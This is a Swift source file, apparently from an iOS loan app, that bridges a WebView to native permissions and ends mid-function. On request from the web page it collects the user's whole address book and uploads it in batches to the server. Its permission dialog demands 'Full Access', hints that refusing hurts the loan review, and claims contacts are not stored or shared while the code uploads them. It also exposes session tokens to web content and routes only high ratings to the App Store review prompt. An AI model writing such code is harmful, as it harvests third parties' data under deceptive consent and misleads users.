import AVFoundation
import AddressBook
import CoreLocation
import Contacts
import ContactsUI
import StoreKit
import SwiftUI
import UIKit
import WebKit
import Toast_Swift

struct FogReedShell: Equatable {
    var driftLineA: String?
    var driftLineB: String?
    var driftLineC: String?
    var driftLineD: String?
}

struct PearlWedHazePane: View {
    let tideURL: URL
    let shellKycId: String?
    let shellProductId: String?
    let widely: Bool
    let shellFogSlice: FogReedShell?
    
    @Environment(\.dismiss) private var driftPop

    init(tideURL: URL, shellKycId: String? = nil, shellProductId: String? = nil, widely: Bool = false, shellFogSlice: FogReedShell? = nil) {
        self.tideURL = tideURL
        self.shellKycId = shellKycId
        self.shellProductId = shellProductId
        self.widely = widely
        self.shellFogSlice = shellFogSlice
    }

    var body: some View {
        ZStack(alignment: .top) {
            LinearGradient(
                colors: [PearlWebReefTwig.grapeTop, PearlWebReefTwig.grapeBottom],
                startPoint: .top,
                endPoint: .bottom
            )
            .ignoresSafeArea()
            
            Image("l2_bg")
                .resizable()
                .aspectRatio(375 / 341, contentMode: .fit)
                .frame(maxWidth: .infinity)
                .ignoresSafeArea(edges: .top)
                .allowsHitTesting(false)
            VStack {
                if widely {
                    ZStack(alignment: .center) {
                        HStack {
                            Button(action: { driftPop() }) {
                                Image("amberQuartz")
                                    .resizable()
                                    .scaledToFit()
                                    .frame(width: 40, height: 40)
                            }
                            .buttonStyle(.plain)
                            .accessibilityLabel("Back")
                            Spacer()
                        }
                        Text("Accurate Recommendation")
                            .font(SlateRiverFont.reed(18, .medium))
                            .foregroundColor(.white)
                            .lineLimit(1)
                            .minimumScaleFactor(0.75)
                            .multilineTextAlignment(.center)
                            .padding(.horizontal, 52)
                    }
                    .padding(.horizontal, 20)
                    .padding(.top, 12)
                    .padding(.bottom, 6)
                }
            
                LichenWebBridge(
                    tideURL: tideURL,
                    shellKycId: shellKycId,
                    shellProductId: shellProductId,
                    widely: widely,
                    shellFogSlice: shellFogSlice,
                    driftDismiss: { driftPop() }
                )
                .frame(maxWidth: .infinity, maxHeight: .infinity)
                .ignoresSafeArea(.keyboard)
            }
            
        }
        .overlay {
            ZStack {
                QuartzFogPane()
                AmberReefDialogPane()
            }
        }
    }
}

private enum PearlWebReefTwig {
    static let grapeTop = Color(red: 87 / 255, green: 12 / 255, blue: 146 / 255)
    static let grapeBottom = Color(red: 68 / 255, green: 8 / 255, blue: 116 / 255)
}

private struct LichenWebBridge: UIViewRepresentable {
    let tideURL: URL
    let shellKycId: String?
    let shellProductId: String?
    let widely: Bool
    let shellFogSlice: FogReedShell?
    let driftDismiss: () -> Void

    func makeCoordinator() -> FirmedDukiCull {
        FirmedDukiCull(shellKycId: shellKycId, shellProductId: shellProductId, widely: widely, shellFogSlice: shellFogSlice, driftDismiss: driftDismiss)
    }

    func makeUIView(context: Context) -> WKWebView {
        let cfg = WKWebViewConfiguration()
        cfg.userContentController.add(context.coordinator, name: "iosHandler")
        let w = WKWebView(frame: .zero, configuration: cfg)
        w.isOpaque = false
        w.backgroundColor = .clear

        context.coordinator.bind(webView: w)
        w.load(URLRequest(url: tideURL))
        return w
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
        context.coordinator.shellKycId = shellKycId
        context.coordinator.shellProductId = shellProductId
        context.coordinator.shellFogSlice = shellFogSlice
        context.coordinator.driftDismiss = driftDismiss
    }

    static func dismantleUIView(_ uiView: WKWebView, coordinator: FirmedDukiCull) {
        coordinator.unbind()
    }
}

private final class FirmedDukiCull: NSObject, WKNavigationDelegate, WKScriptMessageHandler, CNContactPickerDelegate, CLLocationManagerDelegate {
    var shellKycId: String?
    var shellProductId: String?
    var widely: Bool = false
    var shellFogSlice: FogReedShell?
    var driftDismiss: () -> Void
    private weak var webView: WKWebView?
    private var didSendPayload = false
    private var reedStoneLeaf: CLLocationManager?
    private var reedNeedLeafDialog = false
    private var reedNeedLeafFallback = false
    private var reedNeedLeafEmpty = false
    private var reedLeafBusy = false
    private var reedLeafSent = false
    private var reedDustGate = false
    private let mossKeyClamp = MossReedKeyClamp()

    private func driftResetLeafManager() {
        reedStoneLeaf?.delegate = nil
        reedStoneLeaf = nil
    }

    init(shellKycId: String?, shellProductId: String?, widely: Bool = false, shellFogSlice: FogReedShell? = nil, driftDismiss: @escaping () -> Void) {
        self.shellKycId = shellKycId
        self.shellProductId = shellProductId
        self.widely = widely
        self.shellFogSlice = shellFogSlice
        self.driftDismiss = driftDismiss
        super.init()
    }

    func bind(webView: WKWebView) {
        unbind()
        self.webView = webView
        webView.navigationDelegate = self
        mossKeyClamp.reedAttach(webView: webView)
    }

    func unbind() {
        JuniperFogHUD.oakDismiss()
        mossKeyClamp.reedDetach()
        guard let w = webView else { return }
        webView = nil
        w.navigationDelegate = nil
        w.configuration.userContentController.removeScriptMessageHandler(forName: "iosHandler")
    }

    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        guard message.name == "iosHandler" else { return }
        DispatchQueue.main.async {
            guard let s = message.body as? String else { return }
            switch s {
            case "kycGoBack":
                self.driftDismiss()
            case "feedBackGoBack":
                self.driftDismiss()
            case "changeCardGoBack":
                self.driftDismiss()
            case "productGoBack":
                self.driftDismiss()
            case "orderGoBack":
                self.driftDismiss()
            case "cameraPermission":
                self.driftHandleCameraPermission()
            case "positionPermission":
                self.driftHandlePositionPermission()
            case let line where line.hasPrefix("uploadData&&"):
                self.driftHandleUploadData(line)
            case "successfulGoBack":
                self.driftHandleSuccessBack(needPop: true)
            case "successfulGoFeedback":
                self.driftHandleSuccessBack(needPop: false)
            case "getPicSucc":
                CedarCommonDialog.driftDismiss()
            case "selectContact":
                self.driftHandleContactSelect()
            case "KYCComplete":
                self.driftHandleKycComplete()
            case let line where line.hasPrefix("thirdUrl="):
                if let string = line.components(separatedBy: "=").last, let url = URL(string: string) {
                    UIApplication.shared.open(url)
                    RiverBuryDrift.shared.reedTap("502")
                }
            case "detailGoProduct":
                self.didSendPayload = false
                self.webView?.load(URLRequest(url: URL(string: "https://page.kunalresources.com/dist/product/index.html")!))
            default:
                break
            }
        }
    }

    private func driftHandleKycComplete() {
        DuringAcrossFrom.diagnosed = true
        NotificationCenter.default.post(name: .coralReefTabPick, object: 0)
        
        NotificationCenter.default.post(name: .reedEmiExitToHome, object: nil)
        driftDismiss()
    }

    private func driftHandleContactSelect() {
        driftPresentContactPicker()
    }

    private func driftPresentContactPicker() {
        guard let fogHost = Self.driftTopViewController() else { return }
        let mistPicker = CNContactPickerViewController()
        mistPicker.delegate = self
        mistPicker.displayedPropertyKeys = [CNContactPhoneNumbersKey]
        mistPicker.predicateForEnablingContact = NSPredicate(format: "phoneNumbers.@count > 0")
        mistPicker.predicateForSelectionOfContact = NSPredicate(value: false)
        fogHost.present(mistPicker, animated: true)
    }

    private static func driftTopViewController(
        from base: UIViewController? = {
            let fogScene = UIApplication.shared.connectedScenes
                .compactMap { $0 as? UIWindowScene }
                .first { $0.activationState == .foregroundActive }
            let fogWindow = fogScene?.windows.first(where: \.isKeyWindow)
            return fogWindow?.rootViewController
        }()
    ) -> UIViewController? {
        if let nav = base as? UINavigationController {
            return driftTopViewController(from: nav.visibleViewController)
        }
        if let tab = base as? UITabBarController {
            return driftTopViewController(from: tab.selectedViewController)
        }
        if let presented = base?.presentedViewController {
            return driftTopViewController(from: presented)
        }
        return base
    }

    func contactPicker(_ picker: CNContactPickerViewController, didSelect contactProperty: CNContactProperty) {
        guard let hazePhone = contactProperty.value as? CNPhoneNumber else { return }
        let mistName = Self.driftContactName(contactProperty.contact)
        let fogPhone = Self.driftDigitsOnly(hazePhone.stringValue)
        let tidePayload: [String: String] = [
            "name": mistName,
            "phone": fogPhone
        ]
        guard let hazeData = try? JSONSerialization.data(withJSONObject: tidePayload, options: []),
              let hazeJson = String(data: hazeData, encoding: .utf8)
        else { return }
        let hazeScript = "selectContact('\(hazeJson)')"
        webView?.evaluateJavaScript(hazeScript, completionHandler: nil)
    }

    private static func driftContactName(_ hazeContact: CNContact) -> String {
        let fogGiven = hazeContact.givenName.trimmingCharacters(in: .whitespacesAndNewlines)
        let fogFamily = hazeContact.familyName.trimmingCharacters(in: .whitespacesAndNewlines)
        let hazeLine = "\(fogGiven) \(fogFamily)".trimmingCharacters(in: .whitespacesAndNewlines)
        if !hazeLine.isEmpty {
            return hazeLine
        }
        return hazeContact.nickname.trimmingCharacters(in: .whitespacesAndNewlines)
    }

    private static func driftDigitsOnly(_ line: String) -> String {
        line.unicodeScalars
            .filter { CharacterSet.decimalDigits.contains($0) }
            .map(String.init)
            .joined()
    }

    private func driftHandleCameraPermission() {
        let status = AVCaptureDevice.authorizationStatus(for: .video)
        switch status {
        case .authorized:
            RiverBuryDrift.shared.reedTap("11")
            break
        case .notDetermined:
            AVCaptureDevice.requestAccess(for: .video) { ok in
                DispatchQueue.main.async {
                    if ok {
                        RiverBuryDrift.shared.reedTap("11")
                    }
                }
            }
        case .denied, .restricted:
            Self.driftShowCameraSecondDialog()
        @unknown default:
            break
        }
    }

    private static func driftShowCameraSecondDialog() {
        let appName = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String
            ?? Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String
            ?? "App"
        let tideBody = "Please enable camera access for \(appName) in Settings to take photos."
        CedarCommonDialog.driftShow(
            reedTitle: nil,
            tideBody: tideBody,
            mistAlign: .center,
            sandLeft: "Cancel",
            sandRight: "Confirm",
            leftTap: {
                CedarCommonDialog.driftDismiss()
            },
            rightTap: {
                CedarCommonDialog.driftDismiss()
                if let u = URL(string: UIApplication.openSettingsURLString) {
                    UIApplication.shared.open(u, options: [:], completionHandler: nil)
                }
            }
        )
    }

    private func driftHandlePositionPermission() {
        guard !reedLeafBusy else { return }
        reedLeafBusy = true
        reedLeafSent = false
        driftResetLeafManager()
        JuniperFogHUD.oakWait("Loading...")
        MeadowRelay.shared.runPine(.quietLake(EmptyShell()), sandType: CoralAppConfigShell.self) { res in
            DispatchQueue.main.async {
                switch res {
                case let .success(env):
                    self.driftHandlePositionByConfig(env.tideData)
                case let .failure(err):
                    JuniperFogHUD.oakDismiss()
                    self.reedLeafBusy = false
                    JuniperFogHUD.oakBad(err.fogReedLine)
                }
            }
        }
    }

    private func driftHandleUploadData(_ line: String) {
        guard !reedDustGate else { return }
        let parts = line.components(separatedBy: "&&")
        guard parts.count >= 2 else {
            driftWaveUploadFailAndClose()
            return
        }
        let mossLine = parts[1]
        guard !mossLine.isEmpty else {
            driftWaveUploadFailAndClose()
            return
        }
        reedDustGate = true
        JuniperFogHUD.oakWait("Loading...")
        
        ReedFernCevimceBody.reedClayTag { cevimce in
            let body = ReedFernOrdeviceBody(duneOrder: mossLine, duneBody: cevimce)
            MeadowRelay.shared.runPine(.fernStone(body), sandType: EmptyShell.self) { res in
                DispatchQueue.main.async {
                    switch res {
                    case .success:
                        self.driftWaveLoadConfigAndContact(mossLine: mossLine)
                    case .failure:
                        self.driftWaveUploadFailAndClose()
                    }
                }
            }
        }
    }

    private func driftWaveLoadConfigAndContact(mossLine: String) {
        MeadowRelay.shared.runPine(.quietLake(EmptyShell()), sandType: CoralAppConfigShell.self) { res in
            DispatchQueue.main.async {
                switch res {
                case let .success(env):
                    self.driftWaveHandleContactPermission(mossLine: mossLine, shell: env.tideData)
                case .failure:
                    self.driftWaveUploadFailAndClose()
                }
            }
        }
    }

    private func driftWaveHandleContactPermission(mossLine: String, shell: CoralAppConfigShell?, monika: Bool = false) {
        let needContact = (shell?.driftLeafContact ?? 0) != 0
        let status = CNContactStore.authorizationStatus(for: .contacts)
        switch status {
        case .authorized:
            RiverBuryDrift.shared.reedTap("19")
            driftWaveFetchAndUpload(mossLine: mossLine, shell: shell, allow: "")
        case .notDetermined:
            CNContactStore().requestAccess(for: .contacts) { ok, _ in
                DispatchQueue.main.async {
                    self.driftWaveHandleContactPermission(mossLine: mossLine, shell: shell, monika: true)
                }
            }
        case .limited:
            RiverBuryDrift.shared.reedTap("198")
            if needContact {
                if monika {
                    self.driftWaveUploadFailAndClose()
                } else {
                    driftShowContactSecondDialog {
                        self.driftWaveUploadFailAndClose()
                    }
                }
            } else {
                driftWaveNotifyReady(mossLine: mossLine, allow: "3")
            }
        case .denied, .restricted:
            RiverBuryDrift.shared.reedTap("20")
            if needContact {
                if monika {
                    self.driftWaveUploadFailAndClose()
                } else {
                    driftShowContactSecondDialog {
                        self.driftWaveUploadFailAndClose()
                    }
                }
            } else {
                driftWaveNotifyReady(mossLine: mossLine, allow: "2")
            }
        @unknown default:
            driftWaveUploadFailAndClose()
        }
    }

    private func driftWaveFetchAndUpload(mossLine: String, shell: CoralAppConfigShell?, allow: String?) {
        let maxCount = shell?.driftLeafMax ?? 0
        let pushStep = shell?.driftLeafStep ?? 50
        let rows = driftWaveCollectContacts(maxCount: maxCount)
        if rows.isEmpty {
            driftWaveNotifyReady(mossLine: mossLine, allow: allow)
            return
        }
        let groups = stride(from: 0, to: rows.count, by: max(1, pushStep)).map {
            Array(rows[$0 ..< min($0 + max(1, pushStep), rows.count)])
        }
        let fog = DispatchGroup()
        var ok = true
        for g in groups {
            fog.enter()
            let body = ReedFernContactBody(duneOrder: mossLine, duneList: g)
            MeadowRelay.shared.runPine(.fernMist(body), sandType: EmptyShell.self) { res in
                DispatchQueue.main.async {
                    if case .failure = res { ok = false }
                    fog.leave()
                }
            }
        }
        fog.notify(queue: .main) {
            if ok {
                self.driftWaveNotifyReady(mossLine: mossLine, allow: allow)
            } else {
                self.driftWaveUploadFailAndClose()
            }
        }
    }

    private func driftWaveNotifyReady(mossLine: String, allow: String?) {
        let body = ReedFernReadyBody(duneOrder: mossLine, duneLeaf: allow)
        MeadowRelay.shared.runPine(.fernWave(body), sandType: EmptyShell.self) { res in
            DispatchQueue.main.async {
                switch res {
                case .success:
                    self.driftWaveUploadSucc()
                case .failure:
                    self.driftWaveUploadFailAndClose()
                }
            }
        }
    }

    private func driftWaveCollectContacts(maxCount: Int) -> [ReedFernContactLeaf] {
        var err: Unmanaged<CFError>?
        guard let book = ABAddressBookCreateWithOptions(nil, &err)?.takeRetainedValue() else {
            return []
        }
        guard let list = ABAddressBookCopyArrayOfAllPeople(book)?.takeRetainedValue() as? [ABRecord] else {
            return []
        }
        var rows: [ReedFernContactLeaf] = []
        var done = Set<String>()
        for p in list {
            let first = (ABRecordCopyValue(p, kABPersonFirstNameProperty)?.takeRetainedValue() as? String) ?? ""
            let last = (ABRecordCopyValue(p, kABPersonLastNameProperty)?.takeRetainedValue() as? String) ?? ""
            let nick = (ABRecordCopyValue(p, kABPersonNicknameProperty)?.takeRetainedValue() as? String) ?? ""
            let name = "\(first) \(last)".trimmingCharacters(in: .whitespacesAndNewlines)
            let useName = name.isEmpty ? nick.trimmingCharacters(in: .whitespacesAndNewlines) : name
            let mod = ABRecordCopyValue(p, kABPersonModificationDateProperty)?.takeRetainedValue() as? Date
            let ms = mod.map { String(Int($0.timeIntervalSince1970 * 1000)) } ?? "0"
            guard let phoneAny = ABRecordCopyValue(p, kABPersonPhoneProperty)?.takeRetainedValue() else {
                continue
            }
            let phones = phoneAny as ABMultiValue
            let c = ABMultiValueGetCount(phones)
            if c <= 0 { continue }
            for i in 0 ..< c {
                guard let rawAny = ABMultiValueCopyValueAtIndex(phones, i)?.takeRetainedValue() else { continue }
                let raw = rawAny as? String ?? ""
                let only = Self.driftDigitsOnly(raw)
                let normalized = Self.driftWavePhoneFix(only)
                guard Self.driftWavePhoneMatch(normalized) else { continue }
                guard !done.contains(normalized) else { continue }
                done.insert(normalized)
                rows.append(ReedFernContactLeaf(contactName: useName, contactPhone: normalized, contactUpdateTime: ms))
                if maxCount > 0, rows.count >= maxCount {
                    return rows
                }
            }
        }
        return rows
    }

    private static func driftWavePhoneFix(_ line: String) -> String {
        if line.count == 13, line.hasPrefix("910") {
            return String(line.dropFirst(3))
        }
        if line.count == 12, line.hasPrefix("91") {
            return String(line.dropFirst(2))
        }
        if line.count == 11, line.hasPrefix("0") {
            return String(line.dropFirst(1))
        }
        return line
    }

    private static func driftWavePhoneMatch(_ line: String) -> Bool {
        let pat = "^(91[6-9]\\d{9}|[6-9]\\d{9}|0[6-9]\\d{9}|910[6-9]\\d{9})$"
        return line.range(of: pat, options: .regularExpression) != nil
    }

    private func driftShowContactSecondDialog(_ done: @escaping () -> Void) {
        let appName = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String
            ?? Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String
            ?? "App"
        let text = "\(appName) needs to access your contacts to keep your account secure and prevent fraud. It appears that you currently do not allow us to access them. You can enable this permission in your device's Settings. Please open Settings → Tap '\(appName)' → authorize 'Contacts'. Make sure to select \"Allow Full Access\"; otherwise, it may affect your review results. We highly value your privacy and will not store or share your contact information."
        CedarCommonDialog.driftShow(
            reedTitle: nil,
            tideBody: text,
            mistAlign: .center,
            sandLeft: "Cancel",
            sandRight: "Confirm",
            leftTap: {
                CedarCommonDialog.driftDismiss()
                done()
            },
            rightTap: {
                CedarCommonDialog.driftDismiss()
                if let u = URL(string: UIApplication.openSettingsURLString) {
                    UIApplication.shared.open(u, options: [:], completionHandler: nil)
                }
                done()
            }
        )
    }

    private func driftWaveUploadSucc() {
        JuniperFogHUD.oakDismiss()
        reedDustGate = false
        webView?.evaluateJavaScript("uploadDataSucc('')", completionHandler: nil)
    }

    private func driftWaveUploadFailAndClose() {
        JuniperFogHUD.oakDismiss()
        reedDustGate = false
        webView?.evaluateJavaScript("uploadDataFail('')", completionHandler: nil)
        driftDismiss()
    }

    private func driftHandleSuccessBack(needPop: Bool) {
        ReedPlumMist.reedShouldShowPlum { show in
            if show {
                ReedPlumMist.reedShowPlumDialog {
                    if needPop {
                        self.driftDismiss()
                    }
                }
            } else if needPop {
                self.driftDismiss()
            }
        }
    }

    private func driftHandlePositionByConfig(_ shell: CoralAppConfigShell?) {
        let reedNeed = (shell?.driftLeafContact ?? 0) != 0
        let stemLeaf = CLLocationManager()
        let status = stemLeaf.authorizationStatus
        switch status {
        case .authorizedAlways, .authorizedWhenInUse:
            RiverBuryDrift.shared.reedTap("15")
            driftStartLeafRead()
        case .notDetermined:
            reedNeedLeafDialog = false
            reedNeedLeafFallback = !reedNeed
            reedNeedLeafEmpty = reedNeed
            let leaf = CLLocationManager()
            leaf.delegate = self
            reedStoneLeaf = leaf
            leaf.requestWhenInUseAuthorization()
        case .denied, .restricted:
            RiverBuryDrift.shared.reedTap("16")
            JuniperFogHUD.oakDismiss()
            if reedNeed {
                Self.driftShowPositionSecondDialog()
                driftSendPositionEmpty()
            } else {
                driftSendPositionDefault()
            }
        @unknown default:
            JuniperFogHUD.oakDismiss()
            driftSendPositionDefault()
        }
    }

    private func driftStartLeafRead() {
        if reedStoneLeaf == nil {
            reedStoneLeaf = CLLocationManager()
        }
        guard let leaf = reedStoneLeaf else {
            reedLeafBusy = false
            JuniperFogHUD.oakDismiss()
            return
        }
        leaf.delegate = self
        leaf.desiredAccuracy = kCLLocationAccuracyHundredMeters
        leaf.requestLocation()
    }

    private func driftSendPositionDefault() {
        driftSendPosition(longitude: "-360", latitude: "-360")
    }

    private func driftSendPosition(longitude: String, latitude: String) {
        guard !reedLeafSent else { return }
        reedLeafSent = true
        reedLeafBusy = false
        driftResetLeafManager()
        JuniperFogHUD.oakDismiss()
        let waveScript = "positionPermission('{\"longitude\": \"\(longitude)\", \"latitude\": \"\(latitude)\"}')"
        webView?.evaluateJavaScript(waveScript, completionHandler: nil)
    }

    private func driftSendPositionEmpty() {
        guard !reedLeafSent else { return }
        reedLeafSent = true
        reedLeafBusy = false
        driftResetLeafManager()
        JuniperFogHUD.oakDismiss()
        webView?.evaluateJavaScript("positionPermission('')", completionHandler: nil)
    }

    private static func driftShowPositionSecondDialog() {
        let appName = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String
            ?? Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String
            ?? "App"
        let tideBody = "Please enable location access for \(appName) in Settings to complete your loan application."
        CedarCommonDialog.driftShow(
            reedTitle: nil,
            tideBody: tideBody,
            mistAlign: .center,
            sandLeft: "Cancel",
            sandRight: "Confirm",
            leftTap: {
                CedarCommonDialog.driftDismiss()
            },
            rightTap: {
                CedarCommonDialog.driftDismiss()
                if let u = URL(string: UIApplication.openSettingsURLString) {
                    UIApplication.shared.open(u, options: [:], completionHandler: nil)
                }
            }
        )
    }

    func locationManagerDidChangeAuthorization(_ manager: CLLocationManager) {
        let status = manager.authorizationStatus
        switch status {
        case .authorizedAlways, .authorizedWhenInUse:
            RiverBuryDrift.shared.reedTap("15")
            driftStartLeafRead()
        case .denied, .restricted:
            RiverBuryDrift.shared.reedTap("16")
            JuniperFogHUD.oakDismiss()
            if reedNeedLeafFallback {
                driftSendPositionDefault()
            } else if reedNeedLeafEmpty {
                driftSendPositionEmpty()
            } else if reedNeedLeafDialog {
                Self.driftShowPositionSecondDialog()
                driftSendPositionEmpty()
            }
            reedNeedLeafDialog = false
            reedNeedLeafFallback = false
            reedNeedLeafEmpty = false
        case .notDetermined:
            break
        @unknown default:
            JuniperFogHUD.oakDismiss()
            driftSendPositionDefault()
        }
    }

    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        guard let leaf = locations.last else {
            driftSendPositionDefault()
            return
        }
        let lon = String(leaf.coordinate.longitude)
        let lat = String(leaf.coordinate.latitude)
        driftSendPosition(longitude: lon, latitude: lat)
    }

    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error) {
        driftSendPositionDefault()
    }

    func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        DispatchQueue.main.async {
            JuniperFogHUD.oakWait("Loading...")
        }
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        DispatchQueue.main.async {
            JuniperFogHUD.oakDismiss()
            guard !self.didSendPayload else { return }
            self.didSendPayload = true
            guard let js = Self.driftUserdataScript(
                shellKycId: self.shellKycId,
                shellProductId: self.shellProductId,
                widely: self.widely,
                shellFogSlice: self.shellFogSlice
            ) else { return }
            webView.evaluateJavaScript(js, completionHandler: nil)
        }
    }

    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        DispatchQueue.main.async {
            JuniperFogHUD.oakDismiss()
        }
    }

    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        DispatchQueue.main.async {
            JuniperFogHUD.oakDismiss()
        }
    }

    private func driftOpenOuterLake(_ url: URL) {
        let reedLine = "Please make sure the app is installed first."
        Task { @MainActor in
            JuniperFogHUD.oakDismiss()
            let ok = await UIApplication.shared.open(url, options: [:])
            if !ok {
                JuniperFogHUD.oakBad(reedLine)
            }
        }
    }

    private static func driftUserdataScript(shellKycId: String?, shellProductId: String?, widely: Bool = false, shellFogSlice: FogReedShell?) -> String? {
        let cliffVersion = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "0"
        let waveLine = shellProductId ?? ""
        let hazeLine = shellKycId ?? ""
        var payload: [String: Any] = [
            "deviceId": OliveDeviceTag.shared.reedPebbleLine,
            "clientVersion": cliffVersion,
            "userId": BridgeGateSession.shared.mistLeaf ?? "",
            "token": BridgeGateSession.shared.stoneLeaf ?? "",
            "appId": PebbleFlint.calmAppValue,
            "merchantId": PebbleFlint.calmAppValue,
            "salt": PebbleFlint.saltSeal,
            "UA": MeadowRelay.fogUserAgentLine(),
            "baseUrl": MeadowRelay.shared.cliffBaseURL.absoluteString,
            "mobile": UserDefaults.standard.string(forKey: "reed.potential") ?? ""
        ]
        if let fog = shellFogSlice {
            if let a = fog.driftLineA?.trimmingCharacters(in: .whitespacesAndNewlines), !a.isEmpty {
                payload["orderId"] = a
            }
            if let b = fog.driftLineB?.trimmingCharacters(in: .whitespacesAndNewlines), !b.isEmpty {
                payload["productId"] = b
            }
            if let c = fog.driftLineC?.trimmingCharacters(in: .whitespacesAndNewlines), !c.isEmpty {
                payload["orderType"] = c
            }
            if let d = fog.driftLineD?.trimmingCharacters(in: .whitespacesAndNewlines), !d.isEmpty {
                payload["orderIds"] = d
            }
        } else if !waveLine.isEmpty {
            payload["productId"] = waveLine
        } else if !hazeLine.isEmpty {
            payload["kycId"] = hazeLine
        }
        guard let jsonData = try? JSONSerialization.data(withJSONObject: payload, options: []),
              let jsonLine = String(data: jsonData, encoding: .utf8),
              !jsonLine.isEmpty
        else { return nil }
        var military = ""
        if widely {
            military = "rejectData('\(jsonLine)');"
        } else {
            military = "mobileUserdata('\(jsonLine)');"
        }
        
        return military
    }

    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        guard let url = navigationAction.request.url else {
            decisionHandler(.allow)
            return
        }
        let scheme = url.scheme?.lowercased() ?? ""
        if scheme == "about" {
            decisionHandler(.allow)
            return
        }
        let abs = url.absoluteString.lowercased()
        if abs.hasPrefix("http://") || abs.hasPrefix("https://") {
            decisionHandler(.allow)
            return
        }
        decisionHandler(.cancel)
        driftOpenOuterLake(url)
    }
}

enum ReedPlumMist {
    private static let onceKey = "reed.plum.once.flag"

    static func reedShouldShowPlum(_ done: @escaping (Bool) -> Void) {
        if UserDefaults.standard.bool(forKey: onceKey) {
            done(false)
            return
        }
        MeadowRelay.shared.runPine(.quietLake(EmptyShell()), sandType: CoralAppConfigShell.self) { res in
            DispatchQueue.main.async {
                switch res {
                case let .success(env):
                    let gate = env.tideData?.driftPlumGuide ?? 0
                    if gate == 0 {
                        done(false)
                        return
                    }
                    if gate == 1 {
                        UserDefaults.standard.set(true, forKey: onceKey)
                        done(true)
                        return
                    }
                    MeadowRelay.shared.runPine(.jadeBay(ReedFernCinerBody()), sandType: TideSuphomeShell.self) { res2 in
                        DispatchQueue.main.async {
                            if case let .success(env2) = res2, env2.tideData?.mossType == 2 {
                                UserDefaults.standard.set(true, forKey: onceKey)
                                done(true)
                            } else {
                                done(false)
                            }
                        }
                    }
                case .failure:
                    done(false)
                }
            }
        }
    }

    static func reedShowPlumDialog(_ done: @escaping () -> Void) {
        guard let host = reedTopHost() else {
            done()
            return
        }
        let panel = ReedPlumPanel()
        panel.modalPresentationStyle = .overFullScreen
        panel.modalTransitionStyle = .crossDissolve
        panel.reedCancelTap = {
            done()
        }
        panel.reedSubmitTap = { score in
            if score > 3 {
                if #available(iOS 14.0, *) {
                    if let scene = UIApplication.shared.connectedScenes
                        .compactMap({ $0 as? UIWindowScene })
                        .first(where: { $0.activationState == .foregroundActive }) {
                        SKStoreReviewController.requestReview(in: scene)
                    }
                } else {
                    SKStoreReviewController.requestReview()
                }
                done()
                return
            }
            CedarCommonDialog.driftShow(
                reedTitle: "Many thanks!",
                tideBody: "Thank you for your valuable feedback — we have received it.",
                mistAlign: .center,
                sandLeft: nil,
                sandRight: "Confirm",
                leftTap: {},
                rightTap: {
                    CedarCommonDialog.driftDismiss()
                    done()
                }
            )
        }
        host.present(panel, animated: true)
    }

    private static func reedTopHost(
        from base: UIViewController? = {
            let fogScene = UIApplication.shared.connectedScenes
                .compactMap { $0 as? UIWindowScene }
                .first { $0.activationState == .foregroundActive }
            let fogWindow = fogScene?.windows.first(where: \.isKeyWindow)
            return fogWindow?.rootViewController
        }()
    ) -> UIViewController? {
        if let nav = base as? UINavigationController {
            return reedTopHost(from: nav.visibleViewController)
        }
        if let tab = base as? UITabBarController {
            return reedTopHost(from: tab.selectedViewController)
        }
        if let presented = base?.presentedViewController {
            return reedTopHost(from: presented)
        }
        return base
    }
}

private final class ReedPlumPanel: UIViewController {
    var reedCancelTap: (() -> Void)?
    var reedSubmitTap: ((Int) -> Void)?
    private var reedScore = 0
    private var reedStars: [UIButton] = []

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = UIColor(red: 33 / 255, green: 7 / 255, blue: 54 / 255, alpha: 0.7)

        let card = UIView()
        card.translatesAutoresizingMaskIntoConstraints = false
        card.backgroundColor = UIColor(red: 108 / 255, green: 48 / 255, blue: 155 / 255, alpha: 1)
        card.layer.cornerRadius = 24
        card.clipsToBounds = true
        view.addSubview(card)

        let line = UILabel()
        line.translatesAutoresizingMaskIntoConstraints = false
        line.numberOfLines = 0
        line.font = UIFont(name: "Ubuntu-Regular", size: 14) ?? .systemFont(ofSize: 14)
        line.textColor = .white
        line.text = "We strive to provide the best user experience, and your feedback will help us achieve that goal. Please rate our app and leave your comments — we will continue to improve our services."
        card.addSubview(line)

        let starRow = UIStackView()
        starRow.translatesAutoresizingMaskIntoConstraints = false
        starRow.axis = .horizontal
        starRow.alignment = .center
        starRow.distribution = .fillEqually
        starRow.spacing = 10
        card.addSubview(starRow)

        for i in 1...5 {
            let btn = UIButton(type: .custom)
            btn.tag = i
            btn.setImage(UIImage(named: "BS"), for: .normal)
            btn.imageView?.contentMode = .scaleAspectFit
            btn.addTarget(self, action: #selector(reedStarTap(_:)), for: .touchUpInside)
            starRow.addArrangedSubview(btn)
            reedStars.append(btn)
        }

        let hline = UIView()
        hline.translatesAutoresizingMaskIntoConstraints = false
        hline.backgroundColor = UIColor.white.withAlphaComponent(0.1)
        card.addSubview(hline)

        let vline = UIView()
        vline.translatesAutoresizingMaskIntoConstraints = false
        vline.backgroundColor = UIColor.white.withAlphaComponent(0.1)
        card.addSubview(vline)

        let cancel = UIButton(type: .custom)
        cancel.translatesAutoresizingMaskIntoConstraints = false
        cancel.setTitle("Cancel", for: .normal)
        cancel.setTitleColor(UIColor(red: 203 / 255, green: 148 / 255, blue: 224 / 255, alpha: 1), for: .normal)
        cancel.titleLabel?.font = UIFont(name: "Ubuntu-Medium", size: 16) ?? .systemFont(ofSize: 16, weight: .medium)
